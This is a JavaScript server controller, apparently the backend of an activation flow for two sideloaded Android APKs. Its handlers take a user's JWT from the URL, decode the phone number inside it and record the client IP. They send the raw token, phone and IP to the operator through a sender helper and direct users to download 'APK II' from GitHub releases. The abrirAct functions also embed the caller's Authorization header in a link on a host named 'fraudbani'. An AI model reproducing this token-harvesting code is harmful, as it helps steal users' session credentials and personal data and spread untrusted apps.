import IP from '../models/ip.js'
import { decrypt, encrypt, parseJwt, sender } from '../helpers/index.js'

const renderAct = async(req, res) => {
  
  const raw = req.headers['x-forwarded-for'] 
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
  
  console.log(ip)
  
  const encIp = encrypt(ip)
  
  const auth = req.query.user
  
  const data = parseJwt(auth)
  
  const phone = data.main_phone
  
  const encIpExs = await IP.findOne({encIp})
  
  const authExs = await IP.findOne({ auth })
  
  const phoneExs = await IP.findOne({ phone })
  
  if(!req.query.user) {
    return res.render('activador.hbs', { adv: 'Error, petición sin token!', advIcon: 'warningRedIcon', Avalue: 'Inicio', href: '/' })
  }
  console.log(auth)
  
  if( authExs ) {
    if(authExs.auth == auth) {
    return res.status(500).render('activador.hbs',{adv: `Usuario ya fué activado, instala el Apk II.`, advIcon: 'warningIcon', Avalue: 'Descargar', href: 'https://github.com/bornredjames/Testing/releases/download/Si/APK.II_32bits.apk'})
  }
  }
  
  if(!encIpExs) {
    sender(`Intento sin descargar de web --> ${ auth }
    From: ${ ip }`)
    return res.status(500).render('activador.hbs', { adv: `Descarga el APK I desde la página principal, recuerda que si alguien te vendió o intentó vender ésta apk fuiste estafado.`, advIcon: 'warningRedIcon', Avalue: 'Página principal', href: '/'})
  }
  
  if(phoneExs) {
    phoneExs.auth = req.query.user
    await phoneExs.save()
    sender(`Usuario reactivado
🔑: ${req.query.user}
📱: ${phone}
From: ${ ip }`)
  } else {
    encIpExs.encIp = null
    encIpExs.auth = req.query.user
    encIpExs.phone = phone
    await encIpExs.save()
    sender(`Nuevo usuario activado
🔑: ${req.query.user}
📱: ${phone}
From: ${ ip }`)
  }
  
  sender(`Nuevo usuario activado --> ${req.query.user}
From: ${ ip }`)
  
  res.render('activador.hbs', { adv: `Activado, esta APK es Gratuita si te la están vendiendo o intentando vender estás siendo estafado. Ahora instala el APK II sin desinstalar el APK I.`, advIcon: 'icon_profile_modal_confirm_code', Avalue: 'Descargar APK II', href: 'https://github.com/bornredjames/Testing/releases/download/Si/APK.II_32bits.apk'})
}

const abrirAct = (req, res) => {
  res.json({ URL_FB: `https://fraudbani-fyfr.onrender.com/act/app?user=${req.headers.authorization}` })
}


const renderAct64 = async(req, res) => {
  
  const raw = req.headers['x-forwarded-for'] 
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
  
  console.log(ip)
  
  const encIp = encrypt(ip)
  
  const auth = req.query.user
  
  const data = parseJwt(auth)
  
  const phone = data.main_phone
  
  const encIpExs = await IP.findOne({ encIp })
  
  const phoneExs = await IP.findOne({ phone })
  
  const authExs = await IP.findOne({ auth })
  
  
  //console.log(`TEST --> ${phone}`)
  
  if(!req.query.user) {
    return res.render('activador.hbs', { adv: 'Error, petición sin token!', advIcon: 'warningRedIcon', Avalue: 'Inicio', href: '/' })
  }
  console.log(auth)
  
  if( authExs ) {
    if(authExs.auth == auth) {
    return res.status(500).render('activador.hbs',{adv: `Usuario ya fué activado, instala el Apk II.`, advIcon: 'warningIcon', Avalue: 'Descargar', href: 'https://github.com/bornredjames/Testing/releases/download/Si/APK.II_64bits.apk'})
  }
  }
  
  if(!encIpExs) {
    sender(`Intento sin descargar de web --> ${ auth }
    From: ${ ip }`)
    return res.status(500).render('activador.hbs', { adv: `Descarga el APK I desde la página principal, recuerda que si alguien te vendió o intentó vender ésta apk fuiste estafado.`, advIcon: 'warningRedIcon', Avalue: 'Página principal', href: '/'})
  }
  
  if(phoneExs) {
    phoneExs.auth = req.query.user
    await phoneExs.save()
    sender(`Usuario reactivado
🔑: ${req.query.user}
📱: ${phone}
From: ${ ip }`)
  } else {
    encIpExs.encIp = null
    encIpExs.auth = req.query.user
    encIpExs.phone = phone
    await encIpExs.save()
    sender(`Nuevo usuario activado
🔑: ${req.query.user}
📱: ${phone}
From: ${ ip }`)
  }
  
  
  
  res.render('activador.hbs', { adv: `Activado, esta APK es Gratuita si te la están vendiendo o intentando vender estás siendo estafado. Ahora instala el APK II sin desinstalar el APK I.`, advIcon: 'icon_profile_modal_confirm_code', Avalue: 'Descargar APK II', href: 'https://github.com/bornredjames/Testing/releases/download/Si/APK.II_64bits.apk'})
}

const abrirAct64 = (req, res) => {
  res.json({ URL_FB: `https://fraudbani-fyfr.onrender.com/act64/app?user=${req.headers.authorization}` })
}


export {
  abrirAct,
  abrirAct64,
  renderAct,
  renderAct64
}